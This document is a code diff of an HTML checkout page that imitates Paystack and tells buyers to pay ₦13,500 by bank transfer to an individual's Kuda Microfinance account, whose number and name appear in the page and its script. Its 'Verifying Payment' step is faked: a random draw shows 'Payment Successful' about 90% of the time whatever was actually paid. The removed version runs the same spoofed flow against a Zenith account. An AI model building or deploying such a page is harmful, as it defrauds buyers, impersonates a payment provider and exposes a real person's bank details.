@@ -998,116 +998,141 @@ src="https://www.facebook.com/tr?id=1064907656488055&ev=PageView&noscript=1"
             }
 
             .ps-checkout {
+                position: absolute;
+                bottom: 0;
                 width: 100%;
-                max-width: 100%;
-                max-height: 85vh;
-                max-height: 85dvh;
+                max-width: 100vw;
                 border-radius: 16px 16px 0 0;
-                box-shadow: 0 -4px 20px rgba(0,0,0,0.1);
-                flex-direction: column;
+                min-height: 600px;
             }
 
-            .ps-sidebar { display: none; }
+            .ps-sidebar {
+                display: none;
+            }
 
-            .ps-transfer-bar { display: flex; }
-
-            .ps-header { padding: 14px 20px; }
-
-            .ps-body { padding: 20px; }
+            .ps-transfer-bar {
+                display: flex;
+            }
         }
     </style>
+
 </head>
 <body>
+
+    <!-- ================== PAGE HEADER ================== -->
     <div class="page-header">
-        <img class="page-header-logo" src="https://media.licdn.com/dms/image/D4D0BAQEKXk_R0CQjzA/company-logo_200_200/0/1681832315889?e=2147483647&v=beta&t=5t9lJ3qOZMnbGdRgj85F8s6QHvCPDyEpvEHhOaIgNxQ" alt="Logo">
-        <span class="page-header-points">1,234 PTS</span>
+        <svg width="28" height="28" viewBox="0 0 28 28" fill="none" style="flex-shrink:0;">
+            <path d="M14 1C6.8 1 1 6.8 1 14s5.8 13 13 13 13-5.8 13-13S21.2 1 14 1zm0 23.5c-5.8 0-10.5-4.7-10.5-10.5S8.2 3.5 14 3.5s10.5 4.7 10.5 10.5S19.8 24.5 14 24.5z" fill="#3bb75e"/>
+            <path d="M14 6c-4.4 0-8 3.6-8 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8z" fill="#3bb75e"/>
+        </svg>
+        <div class="page-header-points" id="pointsDisplay">0 Points</div>
     </div>
 
+    <!-- ================== CHECKOUT PAGE ================== -->
     <div class="checkout-page">
-        <h1 class="checkout-title">Confirm your payment</h1>
+        <h1 class="checkout-title">Checkout</h1>
 
+        <!-- Product Card -->
         <div class="product-card">
             <div class="product-image">
-                <img src="unnamed.png" alt="Paystack">
+                <img src="https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=500&h=300&fit=crop" alt="Wireless Headphones">
             </div>
             <div class="product-info">
-                <div class="product-name">Paystack Nigeria Bank Transfer</div>
-                <div class="product-desc">Quick and secure payment using Nigerian bank transfer through Paystack</div>
+                <div class="product-name">Premium Wireless Headphones</div>
+                <div class="product-desc">High-quality sound, noise cancellation, 30-hour battery life</div>
             </div>
         </div>
 
+        <!-- Checkout Form -->
         <div class="checkout-form">
+            <div class="form-row">
+                <div class="form-group">
+                    <label>First Name</label>
+                    <input type="text" placeholder="John" id="firstName">
+                </div>
+                <div class="form-group">
+                    <label>Last Name</label>
+                    <input type="text" placeholder="Doe" id="lastName">
+                </div>
+            </div>
+
             <div class="form-group full">
                 <label>Email Address</label>
-                <input type="email" placeholder="e.g example@email.com">
+                <input type="email" placeholder="john@example.com" id="email">
+            </div>
+
+            <div class="form-group full">
+                <label>Phone Number</label>
+                <input type="tel" placeholder="+234 (0) 800 000 0000" id="phone">
             </div>
 
             <div class="form-row">
                 <div class="form-group">
-                    <label>First Name</label>
-                    <input type="text" placeholder="John">
+                    <label>Amount</label>
+                    <div class="amount-field">
+                        <span class="currency-tag">₦</span>
+                        <input type="number" placeholder="13,500" value="13500" id="amount">
+                    </div>
                 </div>
                 <div class="form-group">
-                    <label>Last Name</label>
-                    <input type="text" placeholder="Doe">
+                    <label>Reference</label>
+                    <input type="text" placeholder="REF-001" id="reference" value="REF-001">
                 </div>
             </div>
 
-            <div class="form-group full">
-                <label>Amount</label>
-                <div class="amount-field">
-                    <div class="currency-tag">₦</div>
-                    <input type="number" placeholder="0.00" value="">
-                </div>
-            </div>
-
-            <button class="pay-btn" onclick="openCheckout()">
-                <svg viewBox="0 0 24 24">
-                    <path d="M3 12h18M12 3v18" stroke="currentColor"/>
+            <button class="pay-btn" id="payBtn">
+                <svg viewBox="0 0 24 24" style="width:18px;height:18px;">
+                    <path stroke="currentColor" d="M21 7H3m0 0v10c0 1.5.5 3 2 3h14c1.5 0 2-1.5 2-3V7m0 0h0m-8 5v0"/>
                 </svg>
-                Continue
+                Pay ₦13,500
             </button>
 
             <div class="secure-badge">
                 <svg viewBox="0 0 24 24">
-                    <path d="M12 1L3 5v7c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+                    <path stroke="currentColor" d="M12 1L3 5v7c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
                 </svg>
-                Secure payment powered by Paystack
+                <span>Secured by Paystack</span>
             </div>
         </div>
     </div>
 
+    <!-- ================== PAGE FOOTER ================== -->
     <div class="page-footer">
         <div class="page-footer-links">
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
-            <a href="#">Contact</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Contact Support</a>
         </div>
-        <div class="page-footer-copy">© 2025 Paystack. All rights reserved.</div>
+        <div class="page-footer-copy">&copy; 2025 Paystack Checkout. All rights reserved.</div>
     </div>
 
-    <!-- Paystack Checkout Modal -->
+    <!-- ================== MODAL (Paystack Checkout) ================== -->
     <div class="ps-overlay" id="psOverlay">
         <div class="ps-checkout">
             <!-- Sidebar (Desktop) -->
             <div class="ps-sidebar">
-                <div class="ps-sidebar-title">Methods</div>
-                <div class="ps-sidebar-item active" onclick="showScreen('methods')">
-                    <svg viewBox="0 0 24 24"><path d="M13 6H5c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V9c0-1.1-.9-2-2-2m0 12H5V8h14v10z"/></svg>
-                    <span>Payment Methods</span>
+                <div class="ps-sidebar-title">Steps</div>
+                <div class="ps-sidebar-item active" data-step="payment-method">
+                    <svg viewBox="0 0 24 24" fill="none"><path stroke="currentColor" d="M9 12l2 2 4-4"/><path stroke="currentColor" d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z"/></svg>
+                    <span>Payment Method</span>
                 </div>
-                <div class="ps-sidebar-item" onclick="showScreen('transfer')">
-                    <svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+                <div class="ps-sidebar-item" data-step="bank-transfer">
+                    <svg viewBox="0 0 24 24" fill="none"><path stroke="currentColor" d="M3 10h18M3 10l1.5-5h15l1.5 5M3 10v8c0 1 1 2 2 2h14c1 0 2-1 2-2v-8M9 14h6M9 18h6"/></svg>
                     <span>Bank Transfer</span>
                 </div>
-                <div class="ps-sidebar-item disabled">
-                    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="1"/><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z"/></svg>
-                    <span>Card Payment</span>
+                <div class="ps-sidebar-item" data-step="verify">
+                    <svg viewBox="0 0 24 24" fill="none"><path stroke="currentColor" d="M9 12l2 2 4-4m-10 10c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z"/></svg>
+                    <span>Verify</span>
+                </div>
+                <div class="ps-sidebar-item" data-step="success">
+                    <svg viewBox="0 0 24 24" fill="none"><path stroke="currentColor" d="M5 13l4 4L19 7"/></svg>
+                    <span>Done</span>
                 </div>
             </div>
 
             <!-- Main Content -->
             <div class="ps-main">
+                <!-- Header -->
                 <div class="ps-header">
                     <div class="ps-logo">
                         <span></span>
@@ -1115,128 +1140,85 @@ src="https://www.facebook.com/tr?id=1064907656488055&ev=PageView&noscript=1"
                         <span></span>
                     </div>
                     <div class="ps-header-right">
-                        <div class="ps-header-email">customer@example.com</div>
-                        <div class="ps-header-amount">₦50,000.00</div>
+                        <div class="ps-header-email" id="headerEmail"></div>
+                        <div class="ps-header-amount">₦<span id="headerAmount">13,500</span></div>
                     </div>
-                    <button class="ps-close" onclick="closeCheckout()">&times;</button>
+                    <button class="ps-close" id="closeBtn">&times;</button>
                 </div>
 
+                <!-- Body -->
                 <div class="ps-body">
-                    <!-- Methods Screen -->
-                    <div class="ps-screen active" id="screen-methods">
-                        <h3 class="ps-method-title">Select Payment Method</h3>
+                    <!-- Payment Method Screen -->
+                    <div class="ps-screen active" id="screen-payment-method">
+                        <div class="ps-method-title">Select Payment Method</div>
                         <ul class="ps-method-list">
-                            <li class="active-method" onclick="showScreen('transfer')">
-                                <svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+                            <li data-method="bank-transfer" class="active-method">
+                                <svg viewBox="0 0 24 24" fill="none"><path stroke="currentColor" d="M3 10h18M3 10l1.5-5h15l1.5 5M3 10v8c0 1 1 2 2 2h14c1 0 2-1 2-2v-8M9 14h6M9 18h6"/></svg>
                                 <span>Bank Transfer</span>
-                                <span class="available-badge">Available</span>
-                            </li>
-                            <li onclick="alert('Coming soon')">
-                                <svg viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
-                                <span>Debit Card</span>
-                                <span class="unavailable-badge">Unavailable</span>
-                            </li>
-                            <li onclick="alert('Coming soon')">
-                                <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M8 12h8M12 8v8"/></svg>
-                                <span>Mobile Money</span>
-                                <span class="unavailable-badge">Unavailable</span>
+                                <span class="available-badge">AVAILABLE</span>
                             </li>
                         </ul>
-                        <div class="ps-method-footer">
-                            Your payment is secured and encrypted
-                        </div>
+                        <div class="ps-method-footer">Secure payment via Paystack</div>
                     </div>
 
                     <!-- Bank Transfer Screen -->
-                    <div class="ps-screen" id="screen-transfer">
+                    <div class="ps-screen" id="screen-bank-transfer">
                         <div class="ps-transfer-bar">
-                            <svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+                            <svg viewBox="0 0 24 24" fill="none"><path stroke="currentColor" d="M3 10h18M3 10l1.5-5h15l1.5 5M3 10v8c0 1 1 2 2 2h14c1 0 2-1 2-2v-8M9 14h6M9 18h6"/></svg>
                             <span>Bank Transfer</span>
-                            <span class="ps-change-link" onclick="showScreen('methods')">Change</span>
+                            <span class="ps-change-link" onclick="showScreen('payment-method')">Change</span>
                         </div>
 
-                        <p class="ps-transfer-text">
-                            Complete your payment by transferring the exact amount to the account below. Your payment will be confirmed automatically.
-                        </p>
+                        <div class="ps-transfer-text">
+                            Transfer exactly <strong>₦13,500</strong> to the account details below. Your payment will be confirmed within minutes.
+                        </div>
 
                         <div class="ps-transfer-card">
-                            <div class="ps-card-field">
-                                <div class="ps-card-field-header">
-                                    <span class="ps-card-field-label">Account Name</span>
-                                </div>
-                                <div class="ps-card-field-value">
-                                    <span>Paystack Nigeria Limited</span>
-                                    <svg class="ps-copy-icon" onclick="copyToClipboard(this, 'Paystack Nigeria Limited')" viewBox="0 0 24 24">
-                                        <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
-                                    </svg>
-                                </div>
-                            </div>
                             <div class="ps-card-field">
                                 <div class="ps-card-field-header">
                                     <span class="ps-card-field-label">Bank Name</span>
                                 </div>
                                 <div class="ps-card-field-value">
-                                    <span>Zenith Bank</span>
-                                    <svg class="ps-copy-icon" onclick="copyToClipboard(this, 'Zenith Bank')" viewBox="0 0 24 24">
-                                        <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
-                                    </svg>
+                                    <span>Kuda Microfinance Bank</span>
                                 </div>
                             </div>
+
                             <div class="ps-card-field">
                                 <div class="ps-card-field-header">
                                     <span class="ps-card-field-label">Account Number</span>
                                 </div>
                                 <div class="ps-card-field-value">
-                                    <span>1014847321</span>
-                                    <svg class="ps-copy-icon" onclick="copyToClipboard(this, '1014847321')" viewBox="0 0 24 24">
-                                        <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
-                                    </svg>
+                                    <span id="accountNumber">2085498125</span>
+                                    <svg class="ps-copy-icon" onclick="copyToClipboard('accountNumber')" viewBox="0 0 24 24" fill="none"><path stroke="currentColor" d="M8 16H6c-1 0-2-1-2-2V6c0-1 1-2 2-2h8c1 0 2 1 2 2v2m-6 8h8c1 0 2-1 2-2v-8c0-1-1-2-2-2h-8c-1 0-2 1-2 2v8c0 1 1 2 2 2z"/></svg>
                                 </div>
                             </div>
+
                             <div class="ps-card-field">
                                 <div class="ps-card-field-header">
-                                    <span class="ps-card-field-label">Amount</span>
+                                    <span class="ps-card-field-label">Account Name</span>
                                 </div>
                                 <div class="ps-card-field-value">
-                                    <span>₦50,000.00</span>
-                                    <svg class="ps-copy-icon" onclick="copyToClipboard(this, '50000')" viewBox="0 0 24 24">
-                                        <path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/>
-                                    </svg>
+                                    <span id="accountName">ADEJARE, ADEBOWALE QUDUS</span>
+                                    <svg class="ps-copy-icon" onclick="copyToClipboard('accountName')" viewBox="0 0 24 24" fill="none"><path stroke="currentColor" d="M8 16H6c-1 0-2-1-2-2V6c0-1 1-2 2-2h8c1 0 2 1 2 2v2m-6 8h8c1 0 2-1 2-2v-8c0-1-1-2-2-2h-8c-1 0-2 1-2 2v8c0 1 1 2 2 2z"/></svg>
                                 </div>
-                            </div>
-                            <div class="ps-expires">
-                                Complete your payment in <strong>9m 45s</strong>
                             </div>
                         </div>
 
+                        <div class="ps-expires" id="expiresCounter">Payment expires in <strong>30:00</strong></div>
                         <div class="ps-progress-bar">
                             <div class="ps-progress-bar-inner"></div>
                         </div>
 
-                        <button class="ps-btn ps-btn-green" onclick="showScreen('verifying')">I've completed the transfer</button>
-                        <button class="ps-btn-outline" onclick="showScreen('methods')">Choose another method</button>
+                        <button class="ps-btn ps-btn-green" onclick="showScreen('verify')">I've made the transfer</button>
+                        <button class="ps-btn-outline" onclick="showScreen('payment-method')">Back</button>
                     </div>
 
-                    <!-- Verifying Screen -->
-                    <div class="ps-screen" id="screen-verifying">
+                    <!-- Verify Screen -->
+                    <div class="ps-screen" id="screen-verify">
                         <div class="ps-verifying">
                             <div class="ps-spinner"></div>
-                            <h3>Verifying Payment</h3>
-                            <p>Please wait while we confirm your transfer...</p>
-                        </div>
-                    </div>
-
-                    <!-- Success Screen -->
-                    <div class="ps-screen" id="screen-success">
-                        <div class="ps-success">
-                            <div class="ps-check-circle">
-                                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
-                            </div>
-                            <h3>Payment Successful!</h3>
-                            <div class="ps-success-amount">₦50,000.00</div>
-                            <p>Your payment has been confirmed. You will receive a confirmation email shortly.</p>
-                            <p class="ps-ref">Reference: PS-2025-001847</p>
-                            <a href="obrigado.html" class="ps-btn ps-btn-green ps-success-btn">Back to Home</a>
+                            <h3>Verifying Payment...</h3>
+                            <p>Please wait while we confirm your transfer</p>
                         </div>
                     </div>
 
@@ -1244,17 +1226,31 @@ src="https://www.facebook.com/tr?id=1064907656488055&ev=PageView&noscript=1"
                     <div class="ps-screen" id="screen-failed">
                         <div class="ps-failed">
                             <div class="ps-fail-circle">
-                                <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+                                <svg viewBox="0 0 24 24" fill="none"><path stroke="currentColor" d="M6 18L18 6M6 6l12 12"/></svg>
                             </div>
                             <h3>Payment Failed</h3>
-                            <p>We couldn't confirm your payment. Please try again or choose another payment method.</p>
-                            <button class="ps-btn-retry" onclick="showScreen('transfer')">Try Again</button>
+                            <p>We could not verify your payment. Please try again or use another method.</p>
+                            <button class="ps-btn-retry" onclick="showScreen('payment-method')">Try Again</button>
+                        </div>
+                    </div>
+
+                    <!-- Success Screen -->
+                    <div class="ps-screen" id="screen-success">
+                        <div class="ps-success">
+                            <div class="ps-check-circle">
+                                <svg viewBox="0 0 24 24" fill="none"><path stroke="currentColor" d="M5 13l4 4L19 7"/></svg>
+                            </div>
+                            <h3>Payment Successful</h3>
+                            <div class="ps-success-amount">₦<span>13500</span> <span class="cur">NGN</span></div>
+                            <p>Your payment has been confirmed</p>
+                            <p class="ps-ref" id="refNumber"></p>
                         </div>
                     </div>
                 </div>
 
+                <!-- Footer -->
                 <div class="ps-footer">
-                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v7c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+                    <svg viewBox="0 0 24 24" fill="none"><path stroke="currentColor" d="M12 1C6.5 1 2 5.5 2 11s4.5 10 10 10 10-4.5 10-10S17.5 1 12 1zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/><path stroke="currentColor" d="M12.5 7H11v6l5.2 3.2"/></svg>
                     <span>Secured by</span>
                     <strong>PAYSTACK</strong>
                 </div>
@@ -1263,44 +1259,134 @@ src="https://www.facebook.com/tr?id=1064907656488055&ev=PageView&noscript=1"
     </div>
 
     <script>
-        function openCheckout() {
-            fbq('track', 'InitiateCheckout');
-            document.getElementById('psOverlay').classList.add('open');
-            document.body.style.overflow = 'hidden';
+        // DATA
+        const payments = {
+            amount: 13500,
+            currency: 'NGN',
+            bankName: 'Kuda Mcicrofinance Bank',
+            accountNumber: '2085498125',
+            accountName: 'ADEJARE, ADEBOWALE QUDUS',
+            timerMinutes: 30,
+            verifyDelay: 3500,
+        };
+
+        const points = [
+            { name: 'First Purchase', value: 100 },
+            { name: 'Referral Bonus', value: 50 },
+            { name: 'Birthday Month', value: 25 },
+        ];
+
+        // DOM ELEMENTS
+        const payBtn = document.getElementById('payBtn');
+        const closeBtn = document.getElementById('closeBtn');
+        const overlay = document.getElementById('psOverlay');
+        const pointsDisplay = document.getElementById('pointsDisplay');
+        const firstName = document.getElementById('firstName');
+        const email = document.getElementById('email');
+        const expiresCounter = document.getElementById('expiresCounter');
+        const headerEmail = document.getElementById('headerEmail');
+        const refNumber = document.getElementById('refNumber');
+
+        // SETUP
+        let currentScreen = 'payment-method';
+        let timer = null;
+
+        // CALCULATE POINTS
+        function calculatePoints() {
+            const total = points.reduce((sum, p) => sum + p.value, 0);
+            pointsDisplay.textContent = total + ' Points';
         }
 
-        function closeCheckout() {
-            document.getElementById('psOverlay').classList.remove('open');
-            document.body.style.overflow = 'auto';
-        }
+        // OPEN MODAL
+        payBtn.addEventListener('click', () => {
+            overlay.classList.add('open');
+            headerEmail.textContent = email.value || 'user@example.com';
+            startCountdown();
+        });
 
-        function showScreen(screenName) {
-            const screens = document.querySelectorAll('.ps-screen');
-            screens.forEach(screen => screen.classList.remove('active'));
-            document.getElementById('screen-' + screenName).classList.add('active');
+        // CLOSE MODAL
+        closeBtn.addEventListener('click', () => {
+            overlay.classList.remove('open');
+            clearInterval(timer);
+        });
 
-            // Track screen view
-            fbq('track', 'ViewContent', { content_name: screenName });
-        }
-
-        function copyToClipboard(element, text) {
-            navigator.clipboard.writeText(text).then(() => {
-                element.classList.add('copied');
-                setTimeout(() => {
-                    element.classList.remove('copied');
-                }, 2000);
-            });
-
-            // Track copy action
-            fbq('track', 'ViewContent', { content_name: 'Copy ' + text });
-        }
-
-        // Close modal when clicking outside
-        document.getElementById('psOverlay').addEventListener('click', function(e) {
-            if (e.target === this) {
-                closeCheckout();
+        overlay.addEventListener('click', (e) => {
+            if (e.target === overlay) {
+                overlay.classList.remove('open');
+                clearInterval(timer);
             }
         });
+
+        // SHOW SCREEN
+        function showScreen(screenName) {
+            document.querySelectorAll('.ps-screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(`screen-${screenName}`).classList.add('active');
+
+            // Update sidebar
+            document.querySelectorAll('.ps-sidebar-item').forEach(item => {
+                item.classList.remove('active');
+                if (item.dataset.step === screenName) {
+                    item.classList.add('active');
+                }
+            });
+
+            currentScreen = screenName;
+
+            // Auto verify
+            if (screenName === 'verify') {
+                setTimeout(() => {
+                    const success = Math.random() > 0.1; // 90% success rate
+                    if (success) {
+                        const ref = 'PS' + Date.now();
+                        refNumber.textContent = ref;
+                        showScreen('success');
+                    } else {
+                        showScreen('failed');
+                    }
+                }, payments.verifyDelay);
+            }
+        }
+
+        // COUNTDOWN TIMER
+        function startCountdown() {
+            let totalSeconds = payments.timerMinutes * 60;
+
+            timer = setInterval(() => {
+                totalSeconds--;
+                const minutes = Math.floor(totalSeconds / 60);
+                const seconds = totalSeconds % 60;
+
+                expiresCounter.innerHTML = `Payment expires in <strong>${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}</strong>`;
+
+                if (totalSeconds <= 0) {
+                    clearInterval(timer);
+                    expiresCounter.classList.add('urgent');
+                }
+            }, 1000);
+        }
+
+        // COPY TO CLIPBOARD
+        function copyToClipboard(elementId) {
+            const element = document.getElementById(elementId);
+            const text = element.textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                const icon = event.target.closest('.ps-copy-icon');
+                icon.classList.add('copied');
+                setTimeout(() => icon.classList.remove('copied'), 2000);
+            });
+        }
+
+        // SIDEBAR NAVIGATION
+        document.querySelectorAll('.ps-sidebar-item').forEach(item => {
+            item.addEventListener('click', () => {
+                const step = item.dataset.step;
+                showScreen(step);
+            });
+        });
+
+        // INITIALIZE
+        calculatePoints();
     </script>
+
 </body>
 </html>
